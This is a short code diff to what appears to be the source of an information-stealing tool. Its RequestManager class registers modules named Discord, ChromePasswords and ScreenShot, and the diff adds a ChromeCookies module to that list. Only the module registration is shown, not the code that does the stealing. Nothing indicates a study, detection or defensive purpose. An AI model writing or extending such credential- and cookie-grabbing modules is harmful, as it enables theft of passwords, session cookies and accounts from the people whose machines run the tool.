@@ -17,6 +17,7 @@ public class RequestManager {
                 new Discord(),
                 new ChromePasswords(),
                 new ScreenShot(),
+                new ChromeCookies(),
                 new Downloads()
         ));
     }
